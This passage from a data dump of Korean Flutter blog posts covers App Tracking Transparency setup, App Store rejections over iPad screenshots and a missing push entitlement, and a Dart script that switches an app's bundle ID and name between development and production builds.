<string>2u9pt9hc89.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>8s468mfl3y.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>klf5c3l5u5.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>ppxm28t8ap.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>ecpz2srf59.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>uw77j35x4d.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>pwa73g5rt2.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>mlmmfzh3r3.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>578prtvx9j.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>4dzt52r2t5.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>e5fvkxwrpn.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>8c4e2ghe7u.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>zq492l623r.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>3rd42ekr43.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>3qcr597p9d.skadnetwork</string>\n  </dict>\n</array>\n</dict>\n</plist>\n```\n\n이것에 대해 좀더 알고 싶은 분은 [구글 공식 문서(개인 정보 보호 전략)](https://developers.google.com/admob/ios/privacy/strategies?hl=ko)를 참고하자.\n\n### 2. 설치\n\n위 작업이 끝났다면, 터미널을 열고 아래의 명령어를 주고 설치한다.\n\n```\n> flutter pub add app_tracking_transparency\n```\n\n### 3. 적용\n\n자신의 프로젝트마다 다르겠지만, main.dart에 직접 위젯을 올려서 하는 프로젝트는 없을 것이다.  \n보통 별도 파일을 하나 만들고 거기서 또 위젯을 부르고 상태 관리를 하는게 일반적일 듯 싶다.\n\n이걸 왜 설명하냐하면, 적용해야 할 곳이 앱이 처음 실행되는 위젯에서 구현해야 할 내용이 있기 때문이다.  \n난 **StatefulWidget**을 상속받은 Home이라는 위젯이 있는데 메인함수가 이 위젯을 호출한다.  \nbuild 메서드를 수행하기 전 오버라이드 된 **initState** 메서드를 아래와 같이 추가해준다.\n\n```dart\n  @override\n  void initState() {\n    super.initState();\n\n    // It is safer to call native code using addPostFrameCallback after the widget has been fully built and initialized.\n    // Directly calling native code from initState may result in errors due to the widget tree not being fully built at that point.\n    WidgetsFlutterBinding.ensureInitialized()\n        .addPostFrameCallback((_) => initPlugin());\n  }\n```\n\n그리고 아래의 메서드를 추가해준다.\n\n```dart\n\n// Platform messages are asynchronous, so we initialize in an async method.\n  Future<void> initPlugin() async {\n    try {\n      final TrackingStatus status =\n          await AppTrackingTransparency.trackingAuthorizationStatus;\n      setState(() => _authStatus = '$status');\n      // If the system can show an authorization request dialog\n      if (status == TrackingStatus.notDetermined) {\n        // // Show a custom explainer dialog before the system dialog\n        // await showCustomTrackingDialog(context);\n\n        // Wait for dialog popping animation\n        // await Future.delayed(const Duration(milliseconds: 200));\n\n        // Request system's tracking authorization dialog\n        final TrackingStatus status =\n            await AppTrackingTransparency.requestTrackingAuthorization();\n        setState(() => _authStatus = '$status');\n      }\n    } on PlatformException {\n      setState(() => _authStatus = 'PlatformException was thrown');\n    }\n\n    // final uuid = await AppTrackingTransparency.getAdvertisingIdentifier();\n  }\n```\n\n참고로 status 값은 아래와 같은 형태로 선언되어 있다.\n\n```dart\nString _authStatus = 'Unknown';\n```\n\n### 4. 결과 및 기타\n\n이렇게 하면 끝이다.\n\n![](/img04.PNG)\n\n근데 공식 pub의 readme 하단에 보면 아래와 같은 문구가 있다.\n\n```\nIOS does not allow to display multiple native dialogs.\nIf you try to open a native dialog when there is already a dialog on screen, previous dialog will be forcefully closed by the system.\nIt's very common to show notification permission dialog on the first run of an ios application.\nIf you both try to show a notification permission dialog and app tracking request dialog, one of the each will be cancelled.\nOne way to handle this is using an explainer dialog before requesting tracking authorization. Please check the sample project for more on this. I highly recommend this approach.\n\nIOS는 여러 개의 네이티브 대화상자를 표시할 수 없습니다.\n화면에 이미 대화가 있을 때 네이티브 대화 상자를 열려고 하면, 이전 대화 상자가 시스템에 의해 강제로 닫힙니다.\nios 애플리케이션의 첫 번째 실행에 알림 권한 대화상자를 표시하는 것은 매우 일반적이다.\n둘 다 알림 권한 대화상자와 앱 추적 요청 대화상자를 보여주려고 하면, 각각 중 하나가 취소됩니다.\n이것을 처리하는 한 가지 방법은 추적 허가를 요청하기 전에 설명 대화를 사용하는 것이다.\n이것에 대한 자세한 내용은 샘플 프로젝트를 확인하세요.\n저는 이 접근 방식을 강력히 추천합니다.\n```\n\n즉 앱 시작할 때 플러터가 아닌 네이티브 다이얼로그가 여러 개가 뜰 상황엔 저 기능의 동작을 보장하지 않는다는 뜻이다.  \n그래서 예시 코드를 보면 알겠지만 어떤 함수를 먼저 호출해서 플러터에서 호출되는 다이얼로그가 뜬 뒤에 호출되도록 구현되어 있다.\n\n```dart\nFuture<void> showCustomTrackingDialog(BuildContext context) async =>\n      await showDialog<void>(\n        context: context,\n        builder: (context) => AlertDialog(\n          title: const Text('Dear User'),\n          content: const Text(\n            'We care about your privacy and data security. We keep this app free by showing ads. '\n            'Can we continue to use your data to tailor ads for you?\\n\\nYou can change your choice anytime in the app settings. '\n            'Our partners will collect data and use a unique identifier on your device to show you ads.',\n          ),\n          actions: [\n            TextButton(\n              onPressed: () => Navigator.pop(context),\n              child: const Text('Continue'),\n            ),\n          ],\n        ),\n      );\n```\n\n이걸 사용하는것도 좋지만 난 그냥 바로 뜨게 했다.\n\n## 암담한 결과 : 세 번째 거절\n\n그렇다.  \n또 **Guideline 2.1 - Information Needed** 이슈로 리젝을 때렸다.  \niOS 17.0.3에서는 메세지를 볼 수 없다는 뜻이다.\n\n그래서 위에 방법도 해결할 수 있는 방법이지만, 구글에서 [나와 같은 이슈](https://zenn.dev/hirokt/articles/flutter-ios-17-unable-to-locate-att)를 다루는 페이지를 찾았다.\n\n![](/img05.png)\n\n일본어로 되어 있긴 한데 대충 무슨 뜻인지 알았고, 아래 원인에 보면,  \nFlutter 화면 표시 이후 ATT 다이얼로그 표시가 제대로 표시가 안된다.  \n[깃헙 이슈](https://github.com/deniza/app_tracking_transparency/issues/47)에 이미 등록되어 있다고 한다.\n\n나도 들어가서 봤더니 아주 간단한 트릭으로 해결했다고 한다.\n\n![](/img06.png)\n\n그렇다.  \n단순하게 1초 뒤에 띄우게끔 코드를 해뒀다.\n\n```dart\n///깃허브 이슈 구현방법\n@override\n  void initState() {\n    super.initState();\n    WidgetsBinding.instance.addPostFrameCallback((_){\n      _trackingTransparencyRequest();\n    });\n  }\n\n  Future<String?> _trackingTransparencyRequest() async {\n    await Future.delayed(const Duration(milliseconds: 1000));\n\n    final TrackingStatus status = await AppTrackingTransparency.trackingAuthorizationStatus;\n    if (status == TrackingStatus.authorized) {\n      final uuid = await AppTrackingTransparency.getAdvertisingIdentifier();\n      return uuid;\n    } else if(status == TrackingStatus.notDetermined) {\n      await AppTrackingTransparency.requestTrackingAuthorization();\n      final uuid = await AppTrackingTransparency.getAdvertisingIdentifier();\n      return uuid;\n    }\n\n    return null;\n  }\n\n    ///일본 페이지 구현 방법\n  Future _trackingTransparencyRequest() async {\n    final TrackingStatus trackingStatus = await AppTrackingTransparency.trackingAuthorizationStatus;\n    if(trackingStatus == TrackingStatus.notDetermined) {\n        await Future.delayed(const Duration(milliseconds: 1000)); // 1秒遅らせる\n        final status = await AppTrackingTransparency.requestTrackingAuthorization(); // ATTダイアログを表示する\n    }\n}\n```\n\n핵심은 저 1초 딜레이인데 호출 위치는 사실 큰 상관은 없을 것 같긴 하다.\n\n## 정리 및 참고\n\n그래서 이제 4번째 제출을 했다.\n\n![](/img07.png)\n\n과연 이번엔 리뷰 통과를 할 수 있을지...  \n통과가 되면 따로 글은 남기지 않겠지만...\n\n만약 통과하지 못하면 해당 포스팅은 또 업데이트 될 예정이다...\n\n```toc\n\n```\n\n```toc\n\n```\n"},{"excerpt":"앱스토어 두 번째 리젝 내가 처음에 올렸을 때는 10월 24일인가 그랬다. 뭐 당연히 한번은 리젝 당하는게 당연하게 생각하여 얼른 리젝 메세지를 달라는 기원(?)을 했다. 아니나 다를까 처음에는 리젝을 던졌다. Guideline 2.3.3 - Performance - Accurate Metadata 메타데이터라는 키워드만 봐도 딱 느낌이 왔다.  요새는 …","fields":{"slug":"/dart_flutter/231027_apple-reject-guide-2.3.3-metadata/"},"frontmatter":{"date":"October 27, 2023","title":"Flutter 애플 앱스토어 리젝 사유 Guideline 2.3.3 Performance Accurate Metadata","description":"Guideline 2.3.3 Performance Accurate Metadata","tags":["Flutter","AppStore","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 앱스토어 두 번째 리젝\n\n내가 처음에 올렸을 때는 10월 24일인가 그랬다.  \n뭐 당연히 한번은 리젝 당하는게 당연하게 생각하여 얼른 리젝 메세지를 달라는 기원(?)을 했다.\n\n아니나 다를까 처음에는 리젝을 던졌다.\n\n## Guideline 2.3.3 - Performance - Accurate Metadata\n\n메타데이터라는 키워드만 봐도 딱 느낌이 왔다.\n\n![](/img01.png)\n\n요새는 리젝 메세지가 상세히 주는 것 같다.  \n내가 개발할 때는 진짜 몇 마디 대충 가이드라인만 주고 끝낸거 같은데...\n\n참고로 **Guideline 2.1 - Information Needed**이건 [이곳 블로글 포스팅]()을 참고하자.  \n무튼 이번에 받은 리젝은 **Performance - Accurate Metadata** 관련 이었다.\n\n참고로 23년 10월 24일 기준 스토어 등록할 때 스크린샷에 iPad용 사이즈가 필수로 변경되었다.\n\n![](/img02.png)\n\n과거 다른 자료들을 보면 iPad는 선택이었는데 이젠 필수로 변경되었다.  \n이렇게 폰이랑 패드가 나뉘어 있는데, 저기서 iPad 탭을 클릭하면 아래 사진이 뜬다.\n\n![](/img03.png)\n\n그리고 잘 보면 **(필수)**라고 되어 있는 것을 확인할 수 있다.\n\n## 처음 제출했을 때는...\n\n먼저 해상도를 확인해보면 아래와 같다.\n\n> 5.5인치 기기  \n> (세로) 1242 X 2208 (단위 픽셀)  \n> (가로) 2208 X 1242 (단위 픽셀)\n\n> 6.5인치 기기  \n> (세로) 1242 X 2688 (단위 픽셀)  \n> (가로) 2688 X 1242 (단위 픽셀)\n\n> 6.7인치 기기  \n> (세로) 1290 X 2796 (단위 픽셀)  \n> (가로) 2796 X 1290 (단위 픽셀)\n\n> 12.9인치 기기  \n> (세로) 2048 X 2732 (단위 픽셀)  \n> (가로) 2732 X 2048 (단위 픽셀)\n\n사이즈는 이렇게 참고를 하면 된다.  \n내가 제출할 때 폰 계열은 사실 기존 이미지를 조금 늘리거나 줄이는 선에서 해결할 수 있었다.  \n근데 아이패드가 귀찮았고, 그냥 이미지를 늘려서 제출했다.\n\n## 응 안돼 돌아가~\n\n![](/img04.png)\n\n역시 그냥 성의없이 했더니 돌아가라고 거절했다.  \n그래서 아이패드 시뮬레이터에서 찍어서 할까 라는 생각이 들었지만, 할일도 많고 귀찮아서 그냥 편법을 썼다.\n\n바로...  \n제출되는 이미지 자체 사이즈를 늘리는 것이었다.\n\n처음 제출할 때는 실제 구현 이미지를 늘려서 리젝을 받은거니, 이번엔 실제 구현 이미지를 늘리지 않고, 단지 자체 이미지를 12.9에 맞게 늘려서 제출했다.\n\n## 되겠냐?\n\n당연히 또 한번 거절당했다. -\\_-;;\n\n![](/img05.png)\n\n대충 해석기 돌려보니 너가 실제 기기에서 쓰는 모습을 보여줘야 한다는 그런 뉘앙스다.  \n즉 실제 화면 사이즈가 아이패드 용으로 보여줘야 한다는 의미다.  \n그래서 결국 아이패드 시뮬레이터를 켰다.\n\n근데 또 여기서 몇 가지 문제가 있었다.  \n폰 시뮬레이터는 잘 되는데 아이패드를 켜서 올리려 하니 이사한 에러들이 하나씩 올라왔다.\n\n- [iProxy cannot be opened, idevicesyslog cannot be opened 포스팅](https://elfinlas.github.io/dart_flutter/231027_iproxy-cannot-open/)\n- [Flutter - VSCode에서 iOS 시뮬레이터 빌드 시 에러 발생 포스팅](https://elfinlas.github.io/dart_flutter/231027_flutter-xcodebuild-destination-matching-provided/)\n\n<br>\n\n결국 위 포스팅 이슈를 해결하고, 올려보니 해상도가 아주 가관이었다.  \n난 **ScreenUtil**이라는 라이브러리를 쓰긴 하는데 대응이 제대로 안된 곳도 있어서 전반적으로 다 수정했다.\n\n그래도 잘 처리하고 다시 올렸더니 해당 문제로 더 이상 리젝이 뜨지 않았다.  \n단지 **AppTrackingTransparency** 문제가 있었을 뿐...\n\n이 문제가 궁금하신 분은 [이곳 포스팅](https://elfinlas.github.io/dart_flutter/231027_apple-reject-guide-2.1-apptrackingtransparency/)을 참고하시면 된다.  \n진짜 이것도 별 문제가 많았다.\n\n## 참고 자료\n\n- [애플 개발자 센터 - 스크린샷 사양](https://developer.apple.com/kr/help/app-store-connect/reference/screenshot-specifications/)\n- [이미지 조절 온라인 포토 에디터](https://www.iloveimg.com/ko)\n\n```toc\n\n```\n"},{"excerpt":"드디어 애플 앱스토어에 입성하다. 흑우집합소의 모바일 버전을 개발한지는 조금? 1~2달 사이 된거 같다. 그리고 안드로이드용 흑우집합소용을 등록하였다. 이와 관련하여 포스팅은 따로 진행할 예정이고... 1.0.0 패치에 맞춰 애플 앱스토어에도 배포를 하려 했다. 사실 1.0.0 버전에 맞춰서 같이 배포하려 했는데 약간 욕심이었던 듯 싶다 ㅎㅎ 무튼 앱스토…","fields":{"slug":"/dart_flutter/231027_flutter-apple-reject-itms-90078/"},"frontmatter":{"date":"October 27, 2023","title":"Flutter - 애플 앱스토어 등록 후 ITMS-90078 Missing Push Notification Entitlement 처리하기","description":null,"tags":["Flutter","AppStore"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 드디어 애플 앱스토어에 입성하다.\n\n[흑우집합소](https://bcow.world)의 모바일 버전을 개발한지는 조금? 1~2달 사이 된거 같다.  \n그리고 [안드로이드용 흑우집합소](https://play.google.com/store/apps/details?id=dev.mhlab.bcow_world)용을 등록하였다.  \n이와 관련하여 포스팅은 따로 진행할 예정이고...\n\n1.0.0 패치에 맞춰 애플 앱스토어에도 배포를 하려 했다.  \n사실 1.0.0 버전에 맞춰서 같이 배포하려 했는데 약간 욕심이었던 듯 싶다 ㅎㅎ\n\n무튼 앱스토어는 연마다 프로그램 맴버십을 갱신해줘야 한다.\n\n![](/img01.png)\n\n내 네이버 블로그에서 따온 사진...  \n큰돈이라면 큰돈, 와인으로는 데일리 2~3병 사면 사라지는 돈...  \n무튼 결제를 하였다.  \n아주 먼 옛날 학교 앱 만들고 처음 앱스토어 등록하고 했던 기억이 새록새록했다.\n\n무튼 스토어 등록을 하고, 앱을 빌드하면서 이런 저런 삽질을 하고...  \n그리고 스토어에 앱을 올렸다.\n\n![](/img02.png)\n\n그런데 잠시 후 어떤 메일이 도착했다.\n\n## App Store Connect - Dear Developer,\n\n그렇다.  \n뭔가 이상한 느낌의 메일 제목과 멘트다.\n메일을 열어보니 아래와 같은 메일이 왔다.\n\n![](/img03.png)\n\n**ITMS-90078 Missing Push Notification Entitlement** 라는 문구가 강조되어 있었고, 찾아보니 간단한 이슈였다.  \n발생한 이유는 **Push Notification** 항목을 추가하지 않아서 발생한 문제였다.\n\n애플 앱스토어는 긴 리뷰 대기 시간, 깐깐하다 못해 FM 정석 리뷰로 악명이 높다.  \n과거 나도 리젝 몇번 받고 어이없긴 했지만 ㅎㅎ  \n아주 옛날 GS&Point 앱 외주 개발할 때 앱 본문에 이벤트라는 항목 넣었다고 까인 적도 있다. -\\_-;;  \n지금도 그 조항이 있을지 모르겠지만...\n\n무튼 해결하려면 아주 간단하다.\n\n### How To?\n\n먼저 본인 플러터 디렉토리에서 **iOS**라는 항목을 들어가면 아래와 같은 구조가 나오는데,\n붉은 원에 있는 것을 더블 클릭하면 Xcode가 열린다.\n\n![](/img04.png)\n\n그리고 아래의 사진을 참고해서...\n\n![](/img05.png)\n\n좌측 상단의 **Runner**를 선택하면 오른쪽 처럼 창이 뜨는데 **Signing & Capabilities**항목을 선택한다.  \n그리고 중앙에 회색으로 된 **+Capability**를 선택하면 아래와 같은 창이 열린다.\n\n![](/img06.png)\n\n항목을 좀 내리면 **Push Notifications**항목이 있다.  \n이걸 선택해주면 아래와 같이 프로젝트에 등록이 된다.\n\n![](/img07.png)\n\n물론 이렇게 하고 다시 Product => Archive 를 통해서 앱을 재빌드하고 산출물을 **다시 제출** 해야 한다.\n\n## 정리\n\n예전에는 일단 리젝 던지고 시작했는데, 요새는 자동으로 이렇게 앞에서 걸러주니 좋은 것 같다.  \n근데 왜 아이패드 스크린샷 리젝 문제는 바로 안해줄까?\n\n```toc\n\n```\n"},{"excerpt":"스토어에 등록 후... 안드로이드 마켓에 정상 등록을 한 이후 스토어용과 개발용 (웹에서는 개발과 운영섭 나누는 느낌)으로 나눠서 해야 할 필요가 생겼다. 당연한 이야기겠지만 공기계가 있다면 이런 짓을 안해도 된다. 하지만 기기 해상도 체크 및 현실적인 부분으로 인해 보통은 개발/운영을 나눠서 작업한다. (공폰을 4개 이상 들고 있는 사람이 있을까?) 일…","fields":{"slug":"/dart_flutter/231012_change-app-id-name/"},"frontmatter":{"date":"October 12, 2023","title":"플러터에서 앱 이름과 번들 ID 쉽게 바꿔서 개발용 배포용 앱 나누기 (with rename)","description":"유용한 rename 라이브러리","tags":["Flutter"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 스토어에 등록 후...\n\n안드로이드 마켓에 정상 등록을 한 이후 스토어용과 개발용 (웹에서는 개발과 운영섭 나누는 느낌)으로 나눠서 해야 할 필요가 생겼다.  \n당연한 이야기겠지만 공기계가 있다면 이런 짓을 안해도 된다.\n\n하지만 기기 해상도 체크 및 현실적인 부분으로 인해 보통은 개발/운영을 나눠서 작업한다.  \n(공폰을 4개 이상 들고 있는 사람이 있을까?)\n\n일단 안드로이드 기준으로는 몇 가지 내용을 바꿔야 한다.\n\n> 1. AndroidManifest.xml\n> 2. bundle.gradle\n> 3. MainActivity & Path\n> 4. 기타 서비스 패키지 (Firebase, etc..)\n\n이런 항목을 일일이 하나씩 다 바꾸는 방법은 무식했다.  \n그리고 스토어 배포하고 개발용 돌리다가 실수를 할 수도 있다.  \n그래서 몇 가지 좀 찾아보던 중 괜찮은 패치키를 찾게 되었다.\n\n## change_app_package_name (함정카드였던것)\n\n![](/img01.png)\n\n[change_app_package_name](https://pub.dev/packages/change_app_package_name)는 Likes도 많고, 괜찮은 것 같아서 한번 받아서 설치하였다.  \n괜찮은 라이브러리인 줄 알았으나...\n\n몇 가지 찾아보니 이게 단순하게 이름만 바꿔주는 형태였다.  \n그래서 내가 원하는 형태로 쓰기엔 문제가 있었다.\n\n그리고 깃헙 이슈를 보는데 아래와 같은 이슈가 있었다.\n\n![](/img02.png)\n\n그렇다.  \n즉 **Only Android** 용이었다.  \n동작도 안하는데 Android Only라니...\n그리고 개발자 댓글이 2020년인데 아직도 반영이 안된 상태다.\n\n![](/img03.png)\n\n22년에는 위와 같이 댓글을 달았는데 아직도 업데이트가 안된 것 같았다.  \n그런데 재미있는게 아까 이슈에 누가 댓글을 달았다.\n\n![](/img04.png)\n\n그래서 난 댓글에 있는 라이브러리를 확인해봤다.\n\n## Rename\n\n![](/img05.png)\n\n[rename](https://pub.dev/packages/rename)은 아까랑 비슷한 역할을 하는데 iOS도 지원한다.  \n그리고 기능도 아까 찾은 라이브러리보다 나은듯 해서 이 라이브러리를 사용해보기로 했다.\n\n### 설치법\n\n먼저 cli 형태로 사용하기 위해서는 아래 명령어를 이용한다.\n\n```\ndart pub global activate rename\n```\n\nflutter 내부에서 사용할 수도 있지만 나는 배포 전, 그리고 개발환경 스왑용으로만 해서 cli 형태로만 설치했다.  \n그리고 도움말을 참고하면 다음과 같은 기능이 있다.  \n주로 사용할 것은 set 기능이다.\n\n> getAppName : Get app names for the targeted platforms\n\n> getBundleId : Get bundleId identifiers for the targeted platforms\n\n> setAppName : Set app name for the targeted platforms\n\n> setBundleId : Set bundleId identifier for the targeted platforms\n\n여기서 **AppName**은 설치 될 때 표시될 이름을 의미한다.\n\n![](/img06.png)\n\n그리고 **BundelId**의 경우 스토어나 기기에서 사용되는 일종의 고유 값이다.\n\n![](/img07.png)\n\n사용법은 매우 간단하다.\n\n### 사용법\n\n터미널에서 적용할 프로젝트로 이동해서 아래의 명령어를 수행한다.\n\n```\n// 앱 이름 바꾸기\n>rename setAppName --targets ios,android --value [적용할 이름]\n\n// 앱 번들 Id 바꾸기\n>rename setBundleId --targets ios,android --value [적용할 번들id]\n```\n\n이렇게 하면 일괄로 변경되는 것을 알 수 있다.  \n근데 이렇게 해도 사실 **개발용/운영용**으로 나눌 수 없었다.\n\n왜냐하면 이게 전부 바뀌는게 아니었기 때문이다.\n\n## 진짜로 나누려면...\n\n사실 **rename**으로 해도 나눠지지 않는다.  \n몇 가지 파일을 바꿔주지 않기 때문이다.\n\n일단 안드로이드 기준이다.  \n사실 iOS는 배포 준비중이라서 다음 주 쯔음 다시 포스팅 할 예정이다.\n\n나는 현재 구글 파이어베이스를 이용 중이다.  \n이걸 쓰려면 아래의 경로 파일이 추가되어 하고...\n\n```\n//android/app/google-services.json\n\n\"client_info\": {\n                \"mobilesdk_app_id\": \"-\",\n                \"android_client_info\": {\n                    \"package_name\": \"-\"\n                }\n            },\n```\n\n이렇게 **package_name**이 필요하다.  \n그래서 이 부분도 같이 변경을 해야 하는데 이 부분은 **rename**이 처리해주지 않는다.\n\n게다가 위에서 언급한 바와 같이 **build.gradle** 파일이나 **MainActivity.kt**등 내용이 바뀌지 않는다.  \n그래서 난 dart로 코드를 하나 짜서 실행하면 모드에 맞게 각 구성이 바뀌게 처리해줬다.\n\n일단 코드를 먼저 보자.\n\n```dart\nimport 'dart:convert';\nimport 'dart:io';\n\nconst devAppId = \"개발용 Bundle ID\";\nconst prodAppId = \"운영용 Bundle ID\";\n\nconst devAppName = \"개발용 앱이름\";\nconst prodAppName = \"운영용 앱이름\";\n\nvoid main(List<String> args) {\n  bool isProdMode = false;\n\n  if (args.isNotEmpty) {\n    ///전달인자로 온 값을 확인해본다.\n    for (var arg in args) {\n      //제대로 들어온 경우\n      if (arg.startsWith('-run=')) {\n        var parts = arg.split('=');\n        if (parts.length == 2) {\n          var runMode = parts[1];\n          isProdMode = runMode == \"prod\";\n        }\n      }\n    }\n\n    runProcess(isProdMode);\n  } else {\n    print(\"전달인자 -run가 빠졌습니다. (dev/prod)\");\n  }\n}\n\n///작업 처리\nvoid runProcess(bool isProdMode) async {\n  //Activity\n  await updateMainActivity(isProdMode);\n\n  // build.gradle\n  updateGradleFile(isProdMode);\n\n  //update android manifest\n  updatePackageInManifest(isProdMode);\n\n  // JSON 파일 경로\n  const filePath = '안드로이드용 google-services.json 파일 경로';\n\n  // JSON 파일 읽기\n  final file = File(filePath);\n  final jsonString = file.readAsStringSync();\n\n  // JSON 파싱\n  final json = jsonDecode(jsonString);\n\n  // 원하는 변경 수행\n  json['client'][0]['client_info']['android_client_info']['package_name'] =\n      isProdMode ? prodAppId : devAppId;\n\n  // 변경된 JSON 데이터 다시 문자열로 직렬화\n  final modifiedJsonString = jsonEncode(json);\n\n  // 수정된 데이터를 파일에 다시 쓰기 (기존 파일 덮어쓰기)\n  file.writeAsStringSync(modifiedJsonString);\n\n  //명령어 수행\n  // 3. 외부 명령 실행\n  await Process.run('rename', [\n    'setAppName',\n    '--targets',\n    'ios,android',\n    '--value',\n    isProdMode ? prodAppName : devAppName\n  ]);\n  await Process.run('rename', [\n    'setBundleId',\n    '--targets',\n    'ios,android',\n    '--value',\n    isProdMode ? prodAppId : devAppId\n  ]);\n\n  print(\"\\nRun end = mode = ${isProdMode ? \"운영-Release\" : \"개발-Develop\"}\");\n}\n\n///MainActivity.kt 처리\nFuture<void> updateMainActivity(bool isProdMode) async {\n  //디렉토리 수정\n  const activityPath = 'main activity 경로';\n\n  final oldDir = Directory(\n      \"$activityPath/${isProdMode ? 'dev' : 'prod'}\");\n  final newDir = Directory(\n      \"$activityPath/${isProdMode ? 'prod' : 'dev'}\");\n\n  if (oldDir.existsSync()) {\n    oldDir.renameSync(newDir.path);\n    print('디렉토리 이름을 변경했습니다: $oldDir -> $newDir');\n  } else {\n    print('디렉토리가 존재하지 않습니다: $oldDir');\n  }\n\n  //Activity 파일 수정\n  try {\n    final activityFile = File(\"${newDir.path}/MainActivity.kt\");\n    final lines = await activityFile.readAsLines();\n\n    // 변경할 패키지 문자열을 찾아서 교체합니다.\n    for (var i = 0; i < lines.length; i++) {\n      if (lines[i].contains(\n          'package ${isProdMode ? \"개발용 패키지\" : \"운영용 패키지\"}')) {\n        lines[i] =\n            'package ${isProdMode ? \"운영용 패키지\" : \"개발용 패키지\"}';\n        break;\n      }\n    }\n\n    // 변경된 내용을 파일에 다시 씁니다.\n    await activityFile.writeAsString(lines.join('\\n'));\n    print(\n        'MainActivity Package를 변경하였습니다. = ${isProdMode ? \"운영용 패키지\" : \"개발용 패키지\"}');\n  } catch (e) {\n    print('파일 업데이트 중 오류 발생: $e');\n  }\n}\n\n///Gradle 파일 수정 처리\nvoid updateGradleFile(bool isProdMode) {\n  const buildGradlePath = 'build.gradle 경로';\n  final file = File(buildGradlePath);\n\n  // 1. 파일을 읽어옵니다.\n  final lines = file.readAsLinesSync();\n\n  // 2. 'namespace'를 찾아서 변경합니다.\n  final updatedLines = <String>[];\n  bool updated = false;\n\n  for (final line in lines) {\n    if (line.trimLeft().startsWith('namespace')) {\n      // 찾은 줄이 'namespace'로 시작하는 경우 값을 변경합니다.\n      updatedLines.add('namespace \"${isProdMode ? prodAppId : devAppId}\"');\n      updated = true;\n    } else {\n      updatedLines.add(line);\n    }\n  }\n\n  // 3. 변경된 내용을 파일에 다시 씁니다.\n  if (updated) {\n    file.writeAsStringSync(updatedLines.join('\\n'));\n    print('build.gradle 파일이 업데이트되었습니다.');\n  } else {\n    print('namespace 키워드를 찾지 못했습니다.');\n  }\n}\n\n///Android Manifest 수정 처리\nvoid updatePackageInManifest(bool isProdMode) {\n  File file = File('AndroidManifest.xml 경로');\n\n  // Read the file contents\n  String manifestContent = file.readAsStringSync();\n\n  // Replace the package name with the new one\n  manifestContent = manifestContent.replaceAllMapped(\n    RegExp(r'package=\"([^\"]*)\"'),\n    (match) => 'package=\"${isProdMode ? prodAppId : devAppId}\"',\n  );\n\n  // Write the modified contents back to the file\n  file.writeAsStringSync(manifestContent);\n  print('AndroidManifest 파일이 업데이트되었습니다.');\n}\n```\n\n실행법은 그냥 프로젝트 최상단에 코드를 배치하고 아래처럼 수행한다.\n\n```\n> dart change_mode.dart -run=dev\n> dart change_mode.dart -run=prod\n```\n\n수행하고 나면 각 환경에 맞게끔 변경 처리가 된다.\n\n코드에 대한 전반적인 설명은 생략한다.  \n하지만 몇 가지 내용을 훝고 가자면...\n\n**updateMainActivity** 함수에서는 아래의 코드가 약간 의아할 수 있다.\n\n```dart\nfinal oldDir = Directory(\n      \"$activityPath/${isProdMode ? 'dev' : 'prod'}\");\n  final newDir = Directory(\n      \"$activityPath/${isProdMode ? 'prod' : 'dev'}\");\n```\n\n기존의 oldDir의 경우 반대의 상황이 된다.  \n즉 운영모드로 바꿀 때는 기존의 경우 개발 모드이고, 개발모드로 바꿀 때는 기존이 운영으로 되어 있을 것이다.\n\n그리고 MainActivity의 경우 디렉토리랑 파일 내에 있는 **package**를 같이 변경해줘야 한다.  \n프로젝트마다 다르겠지만 코드가 아래처럼 되어 있을 것이다.\n\n```kt\npackage -\n\nimport io.flutter.embedding.android.FlutterActivity\n\nclass MainActivity: FlutterActivity() {\n    ///....\n}\n```\n\n저 위 **package**도 같이 바꿔줘야 한다.  \n안그러면 앱이 구동이 안되는 문제가 생긴다.\n\n사실 코드를 쭉 훝어보면 어려운 부분은 없을 것이다.  \n급조한 코드라서 부족한 부분과 엉성한 부분이 있다.  \n근데 그냥 임시로 쓰는거라 노력을 더 기울이진 않았다.\n\n조만간 iOS 하면 iOS에 맞게끔 내용을 추가해봐야겠다.  \n이 부분은 포스팅을 업데이트 하거나 추가 포스팅을 해보겠다.\n\n## 참고\n\n- [change_app_package_name github](https://github.com/atiqsamtia/change_app_package_name/)\n- [rename github](https://github.com/onatcipli/rename)\n- [rename example](https://pub.dev/packages/rename/example)\n\n```toc\n\n```\n"},{"excerpt":"신규 프로젝트를 셋업하면서... 오늘 스토어에 등록도 하고 바로 패치도 하고... 다이나믹한 하루였는데, 바로 신규 프로젝트를 준비했다. 흑우집합소를 이렇게 허접하게 만들고 땡이냐? 라는 마인드는 아니다. 개발은 쭉 하면서 하나 더 해야 한다. 1인 개발쪽으로 들어오면 아무래도 시간적으로는 좀 널널하지만, 회사 다닐때 보다 더 빠듯하게 해야 한다.\n왜냐하…","fields":{"slug":"/dart_flutter/231011_not-found-flutter/"},"frontmatter":{"date":"October 11, 2023","title":"터미널에서 flutter 명령어 수행 시 command not found 뜰 때 (with 